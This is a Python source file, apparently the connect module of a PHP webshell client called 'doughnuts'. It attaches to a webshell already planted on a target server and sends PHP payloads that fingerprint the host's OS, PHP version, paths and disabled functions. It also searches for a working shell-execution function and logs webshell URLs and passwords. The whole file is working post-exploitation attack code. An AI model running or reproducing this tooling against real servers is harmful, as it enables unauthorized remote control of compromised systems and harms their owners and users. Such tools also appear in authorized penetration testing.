from os import path
from urllib.parse import urlparse

from libs.config import alias, color, gget, gset, set_namespace
from libs.myapp import is_windows, print_webshell_info, send, prepare_system_template

"""
url ['webshell']
webshell.params_dict ['webshell']
webshell.password ['webshell']
webshell.method ['webshell']
webshell.encode_functions ['webshell']  Encoder(s) used by webshell
webshell.disable_functions ['webshell']
webshell.netloc ['webshell']
webshell.download_path ['webshell']
webshell.os_version ['webshell']
webshell.php_version ['webshell']
webshell.root ['webshell']
webshell.v7 ['webshell'] Whether is php7
webshell.iswin ['webshell'] Whether is windows
webshell.upload_tmp_dir ['webshell']
webshell.from_log ['webshell'] Whether connect from log
"""


def get_detectd_exec_php():
    return """$a=array('system', 'exec', 'shell_exec', 'passthru', 'proc_open', 'popen');
$disabled = explode(',', ini_get('disable_functions'));
foreach ($a as $v){
    if (is_callable($v) && !in_array($v, $disabled)){
        echo $v;
        break;
    }
}"""


@alias(True, "c", u="url", m="method", p="pwd")
def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
    """
    connect

    Connect a webshell of php.

    eg: connect {url} {method} {pass} {encoders...}
    """
    method = str(method).upper()
    params_dict = {}
    if method == "GET":
        raw_key = "params"
    elif method == "POST":
        raw_key = "data"
    elif method == "COOKIE":
        raw_key = "cookies"
    elif method == "HEADER":
        raw_key = "headers"
    else:
        print(color.red("Method error"))
        return
    encode_functions = [str(f) for f in encode_functions]
    params_dict[raw_key] = {}
    webshell_netloc = urlparse(url).netloc
    gset("url", url, namespace="webshell")
    gset("webshell.params_dict", params_dict, namespace="webshell")
    gset("webshell.password", pwd, namespace="webshell")
    gset("webshell.method", raw_key, namespace="webshell")
    gset("webshell.encode_functions", encode_functions, namespace="webshell")
    gset("webshell.netloc", webshell_netloc, namespace="webshell")
    gset(
        "webshell.download_path",
        path.join(gget("root_path"), "target", webshell_netloc),
        namespace="webshell",
    )
    gset("webshell.pwd", ".", namespace="webshell")
    res = send('print("c4ca4238a0b923820d|".phpversion()."|cc509a6f75849b");', raw=True)
    if (not res or "c4ca4238a0b923820d" not in res.r_text):
        print(color.red("Connect failed..."))
        if (res):
            print(res.r_text)
        return False
    if ('7.' in res.r_text):
        gset("webshell.v7", True, namespace="webshell")
    if "c4ca4238a0b923820d" in res.r_text:  # 验证是否成功连接
        gset("webshell.php_version", res.r_text.split("c4ca4238a0b923820d|")[1].split("|cc509a6f75849b")[0], namespace="webshell")
        info_req = send(
            "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.ini_get('upload_tmp_dir').'|'.ini_get('disable_functions').'|'.ini_get('open_basedir'));"
        )
        info = info_req.r_text.strip().split("|")
        exec_func = send(get_detectd_exec_php()).r_text.strip()
        prepare_system_template(exec_func)
        gset("webshell.root", info[0], namespace="webshell")
        gset("webshell.os_version", info[1], namespace="webshell")
        gset(
            "webshell.iswin",
            (True if "win" in info[1].lower() else False),
            namespace="webshell",
        )
        gset("webshell.server_version", info[2], namespace="webshell")
        gset("webshell.pwd", info[3], namespace="webshell")
        gset("webshell.prompt", f"doughnuts ({color.cyan(webshell_netloc)}) > ")
        gset("webshell.exec_func", exec_func, namespace="webshell")
        upload_tmp_dir = info[4]
        if (not upload_tmp_dir):
            if (not is_windows()):
                upload_tmp_dir = "/tmp/"
        else:
            if (is_windows()):
                upload_tmp_dir += "\\\\"
            else:
                upload_tmp_dir += "/"
        gset("webshell.upload_tmp_dir", upload_tmp_dir, namespace="webshell")
        disable_function_list = [f.strip() for f in info[5].split(",")]
        if ('' in disable_function_list):
            disable_function_list.remove('')
        gset("webshell.obd", info[6], namespace="webshell")
        gset("webshell.disable_functions", disable_function_list, namespace="webshell")
        from_log = gget("webshell.from_log", "webshell")
        if not from_log:
            with open("webshell.log", "a+") as f:
                f.write(f"{url}|{method}|{pwd}|{'|'.join(encode_functions)}\n")
        else:
            gset("webshell.from_log", False, True, "webshell")
        print(color.cyan("Connect success...\n"))
        print_webshell_info()
        set_namespace("webshell", callback=False)
        if (exec_func == ''):
            print(color.red("No system execute function!\n"))
        return True
